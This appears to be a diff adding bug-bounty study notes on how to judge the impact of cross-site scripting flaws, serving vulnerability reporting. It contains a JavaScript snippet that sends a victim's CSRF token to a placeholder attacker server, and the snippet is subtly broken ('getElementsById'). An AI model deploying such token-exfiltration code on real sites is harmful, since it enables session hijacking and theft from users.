@@ -1,0 +1,16 @@
+- The impact of XSS varies because of several factors. For instance, the type of XSS determines the number of users who could be affected. Stored XSS on a public forum can realistically attack anyone who visits that forum page, so stored XSS is considered the most severe. On the other hand, reflected or DOM XSS can affect only users who click the malicious link, and self-XSS requires a lot of user interaction and social engineering to execute, so they are normally considered lower impact.
+
+- The identities of the affected users matter too. Let’s say a stored XSS vulnerability is on a site’s server logs. The XSS can affect system administrators and allow attackers to take over their sessions. Since the affected users are accounts of high privilege, the XSS can compromise the integrity of the entire application. 
+
+- You might gain access to customer data, internal files, and API keys. You might even escalate the attack into RCE by uploading a
+shell or execute scripts as the admin. If, instead, the affected population is the general user base, XSS allows attackers to steal private data like cookies and session tokens. 
+
+- This can allow attackers to hijack any user’s session and take over the associated account. Most of the time, XSS can be used to read sensitive information on the victim’s page. Since scripts executed during an XSS attack run as the target page, the script is able to access any information on that page. 
+
+- This means that you can use XSS to steal data and escalate your attack from there. This can be done by running a script that sends the data back to you. For example, this code snippet reads the CSRF token embedded on the victim’s page and sends it to the attacker’s server as a URL parameter named token. If you can steal a user’s CSRF tokens, you can execute actions on their behalf by using those tokens to bypass CSRF protection on the site.
+var token = document.getElementsById('csrf-token')[0];
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
+xhr.send(null);
+
+- XSS can also be used to dynamically alter the page the victim sees, so you can replace the page with a fake login page and trick the user into giving you their credentials (often called phishing). XSS can also allow attackers to automatically redirect the victim to malicious pages and perform other harmful operations while posing as the legit site, such as installing malware. Before reporting the XSS you found, make sure to assess the full impact of that particular XSS to include in your vulnerability report.
